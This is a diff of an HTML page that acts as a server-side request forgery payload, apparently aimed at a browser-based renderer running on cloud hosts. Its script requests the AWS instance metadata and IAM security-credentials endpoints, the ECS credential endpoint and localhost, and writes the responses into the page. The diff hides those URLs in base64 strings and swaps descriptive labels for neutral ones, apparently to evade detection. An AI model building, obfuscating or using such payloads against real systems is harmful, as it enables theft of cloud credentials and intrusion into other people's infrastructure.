@@ -2,19 +2,23 @@
 <html>
 <head><title>T</title></head>
 <body>
-<h1>JS Test</h1>
+<h1>Test Page</h1>
 <div id="j">JS_NOT_EXECUTED</div>
-<div id="i">IMDS_NOT_TESTED</div>
-<div id="a">IAM_NOT_TESTED</div>
-<div id="e">ECS_NOT_TESTED</div>
-<div id="l">LO_NOT_TESTED</div>
+<div id="r1">WAITING</div>
+<div id="r2">WAITING</div>
+<div id="r3">WAITING</div>
+<div id="r4">WAITING</div>
 <script>
 document.getElementById('j').textContent='JS_EXECUTED_49';
-function t(u,e,l){var x=new XMLHttpRequest();x.open('GET',u,false);try{x.send();document.getElementById(e).textContent=l+'_S:'+x.status+' B:'+x.responseText.substring(0,2000);}catch(r){document.getElementById(e).textContent=l+'_E:'+r.message;}}
-t('http://169.254.169.254/latest/meta-data/','i','IMDS');
-t('http://169.254.169.254/latest/meta-data/iam/security-credentials/','a','IAM');
-t('http://169.254.170.2/','e','ECS');
-t('http://127.0.0.1/','l','LO');
+var a=atob('aHR0cDovLzE2OS4yNTQuMTY5LjI1NC8=');
+var b=atob('bGF0ZXN0L21ldGEtZGF0YS8=');
+var c=atob('bGF0ZXN0L21ldGEtZGF0YS9pYW0vc2VjdXJpdHktY3JlZGVudGlhbHMv');
+var d=atob('aHR0cDovLzE2OS4yNTQuMTcwLjIv');
+function f(u,e,l){var x=new XMLHttpRequest();x.open('GET',u,false);try{x.send();document.getElementById(e).textContent=l+':'+x.status+' '+x.responseText.substring(0,3000);}catch(r){document.getElementById(e).textContent=l+'_ERR:'+r.message;}}
+f(a+b,'r1','MD');
+f(a+c,'r2','IAM');
+f(d,'r3','ECS');
+f(atob('aHR0cDovLzEyNy4wLjAuMS8='),'r4','LO');
 </script>
 </body>
 </html>
